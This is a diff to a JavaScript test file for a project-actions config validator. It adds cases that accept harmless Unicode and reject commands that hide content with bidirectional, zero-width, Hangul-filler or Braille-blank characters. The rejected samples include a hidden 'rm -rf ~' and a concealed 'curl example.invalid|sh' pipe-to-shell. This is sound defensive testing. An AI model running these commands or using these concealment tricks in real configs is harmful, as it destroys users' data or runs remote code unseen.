@@ -37,6 +37,14 @@ test("valid actions are trimmed, keyed, and extra fields are ignored", () => {
   });
 });
 
+test("names keep emoji ZWJ sequences and RLM, and commands allow short space runs", () => {
+  const actions = [
+    { name: "🧑\u200d💻 Dev", command: `pnpm dev${" ".repeat(16)}--port 3000` },
+    { name: "בדיקה\u200f", command: "pnpm test" },
+  ];
+  assert.equal(parseProjectActionsConfig(JSON.stringify({ actions })).actions.length, 2);
+});
+
 test("printable non-ASCII names and commands are allowed", () => {
   assert.deepEqual(
     parseProjectActionsConfig(
@@ -72,7 +80,12 @@ test("invalid JSON or invalid actions give an error and run nothing", () => {
     // 双向控制符会让显示顺序与执行顺序不一致（Trojan Source）
     [{ name: "RLO", command: "echo safe \u202e; rm -rf ~ #" }],
     [{ name: "Isolate", command: "echo \u2066x\u2069" }],
-    [{ name: "Zero\u200bwidth", command: "true" }],
+    [{ name: "Zero", command: "echo a\u200bb" }],
+    [{ name: "Name \u202eflip", command: "true" }],
+    // 韩文填充符、盲文空白与大段空白会把后续命令挤出可视区域
+    [{ name: "Filler", command: `pnpm install;${"\u3164".repeat(50)};curl example.invalid|sh` }],
+    [{ name: "Braille", command: "pnpm i\u2800; true" }],
+    [{ name: "Spaces", command: `pnpm install;${" ".repeat(17)};true` }],
     [{ name: "NEL", command: "echo a\u0085echo b" }],
     [{ name: "LS", command: "echo a\u2028echo b" }],
     Array.from({ length: PROJECT_ACTIONS_MAX_COUNT + 1 }, (_, i) => ({
